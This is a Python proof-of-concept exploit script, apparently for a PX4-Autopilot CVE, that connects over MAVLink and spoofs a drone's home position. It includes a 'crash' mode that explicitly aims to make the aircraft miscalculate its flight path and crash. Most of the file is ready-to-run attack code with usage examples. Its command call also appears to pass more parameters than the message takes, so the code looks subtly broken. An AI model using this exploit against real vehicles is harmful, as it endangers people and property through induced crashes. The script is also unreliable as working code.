#!/usr/bin/env python3
"""
CVE-2024-29460: Flight Path Manipulation
Exploit for PX4-Autopilot
CVSS Score: 6.6 (Medium)
"""

import sys
import time
from pymavlink import mavutil

def manipulate_home_position(connection, lat, lon, alt):
    """
    Manipulate home point location to cause incorrect flight path calculations
    
    Args:
        connection: MAVLink connection object
        lat: Fake home latitude in degrees
        lon: Fake home longitude in degrees
        alt: Fake home altitude in meters
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[*] Exploiting CVE-2024-29460: Flight Path Manipulation")
    print(f"[*] Manipulating home position to: ({lat:.7f}, {lon:.7f}, {alt}m)")
    
    # Convert to MAVLink format
    lat_int = int(lat * 1e7)
    lon_int = int(lon * 1e7)
    alt_int = int(alt * 1000)  # Convert to mm
    
    # Send SET_HOME_POSITION command
    connection.mav.command_long_send(
        target_system,
        target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_HOME,
        0,  # Confirmation
        0,  # Use specified location (not current)
        0, 0, 0, 0,
        lat_int / 1e7,  # Latitude
        lon_int / 1e7,   # Longitude
        alt / 1000.0     # Altitude in meters
    )
    
    print("[+] Home position manipulation command sent")
    
    # Also send HOME_POSITION message directly
    time_usec = int(time.time() * 1e6)
    connection.mav.home_position_send(
        target_system,
        lat_int,
        lon_int,
        alt_int,
        0, 0, 0, 0, 0, 0, 0, 0, 0  # Attitude and approach vectors
    )
    
    print("[+] HOME_POSITION message sent")
    print("[!] This may cause incorrect flight path calculations and crashes")

def cause_crash_scenario(connection, offset_lat=0.1, offset_lon=0.1):
    """
    Cause crash by manipulating home position far from actual location
    
    Args:
        connection: MAVLink connection object
        offset_lat: Latitude offset in degrees
        offset_lon: Longitude offset in degrees
    """
    print(f"[*] Creating crash scenario with large home position offset...")
    
    # Get current position (if available)
    # For PoC, use a default location and offset it
    base_lat = 37.7749
    base_lon = -122.4194
    
    # Create fake home far from actual location
    fake_lat = base_lat + offset_lat
    fake_lon = base_lon + offset_lon
    
    manipulate_home_position(connection, fake_lat, fake_lon, 0)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 flight_path_manipulation_cve_2024_29460.py <connection> [mode] [params...]")
        print("\nModes:")
        print("  manipulate <lat> <lon> <alt>    Set specific home position")
        print("  crash [offset_lat] [offset_lon] Cause crash scenario")
        print("\nExamples:")
        print("  python3 flight_path_manipulation_cve_2024_29460.py udp:127.0.0.1:14550 manipulate 37.7750 -122.4195 100")
        print("  python3 flight_path_manipulation_cve_2024_29460.py udp:127.0.0.1:14550 crash 0.1 0.1")
        print("\nCVE-2024-29460: Flight Path Manipulation")
        print("Affected: PX4-Autopilot")
        print("CVSS Score: 6.6 (Medium)")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else 'crash'
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Perform action
    if mode == 'manipulate':
        if len(sys.argv) < 6:
            print("[-] Missing parameters for manipulate mode")
            print("[*] Usage: manipulate <lat> <lon> <alt>")
            sys.exit(1)
        
        lat = float(sys.argv[3])
        lon = float(sys.argv[4])
        alt = float(sys.argv[5])
        manipulate_home_position(connection, lat, lon, alt)
        
    elif mode == 'crash':
        offset_lat = float(sys.argv[3]) if len(sys.argv) > 3 else 0.1
        offset_lon = float(sys.argv[4]) if len(sys.argv) > 4 else 0.1
        cause_crash_scenario(connection, offset_lat, offset_lon)
    else:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)
    
    print("\n[+] Exploit attempt completed")

if __name__ == "__main__":
    main()
